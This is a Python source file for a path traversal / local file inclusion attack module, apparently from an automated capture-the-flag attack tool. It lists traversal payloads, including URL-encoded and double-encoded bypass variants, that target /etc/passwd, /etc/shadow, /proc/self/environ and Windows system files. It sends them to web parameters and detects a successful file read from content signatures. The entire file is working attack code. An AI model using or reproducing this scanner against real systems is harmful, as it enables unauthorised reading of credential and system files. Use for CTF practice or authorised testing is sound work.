"""
Local File Inclusion / Path Traversal attack module.
"""
from __future__ import annotations
from attacks.base import BaseAttack
from engine.flag_hunter import has_definite_flag
from rich.console import Console

console = Console()

LFI_PARAM_HINTS = ["file", "path", "page", "template", "include", "src", "load",
                   "view", "doc", "dir", "folder", "content", "lang", "locale"]

FILE_SUCCESS_SIGNATURES = [
    "root:x:", "root:0:0", "/bin/bash", "[boot loader]",
    "for 16-bit app support", "WINDOWS", "win.ini",
    "[extensions]", "MSDOS.SYS",
]

TARGET_FILES = {
    "linux": [
        "../../../../../../../../etc/passwd",
        "../../../../../../../../etc/shadow",
        "../../../../../../../../etc/hosts",
        "../../../../../../../../proc/self/environ",
        "../../../../../../../../flag.txt",
        "../../../../../../../../flag",
        "../../../../../../../../home/user/flag.txt",
        "../../../../../../../../var/www/html/flag.txt",
    ],
    "windows": [
        "..\\..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\boot.ini",
        "../../../../windows/win.ini",
        "../../../../boot.ini",
    ],
    "encoded": [
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ],
}


class LFIAttack(BaseAttack):
    name = "lfi"

    async def run(self, attack_point: dict, payloads: list[str]) -> list[dict]:
        url = attack_point["url"]
        param = attack_point.get("param", "")
        method = attack_point.get("method", "GET")

        if param and not any(hint in param.lower() for hint in LFI_PARAM_HINTS):
            return []

        console.print(f"  [cyan][LFI][/cyan] {method} {url} ?{param}")
        all_findings = []

        all_payloads = list(payloads or [])
        for category in TARGET_FILES.values():
            all_payloads.extend(category)

        for payload in all_payloads:
            if self._should_stop():
                break

            response, findings = await self._try_payload(method, url, param, payload)
            if response is None:
                continue

            is_lfi = any(sig in response.text for sig in FILE_SUCCESS_SIGNATURES)
            flag = has_definite_flag(findings)

            if is_lfi or flag:
                console.print(
                    f"  [bold red][LFI][/bold red] File read! "
                    f"Payload: {payload!r}\n"
                    f"  Preview: {response.text[:200]!r}"
                )
                all_findings.append({
                    "type": "lfi_file_read",
                    "value": f"LFI @ {url} param={param} payload={payload!r}",
                    "confidence": 0.95,
                })

                if flag:
                    console.print(f"  [bold green][LFI][/bold green] FLAG: {flag}")
                    all_findings.extend([f for f in findings if f.get("confidence", 0) >= 1.0])
                    self.stop_event.set()
                    return all_findings

                break  # İlk başarılı okuma yeterli, devam etme

        return all_findings
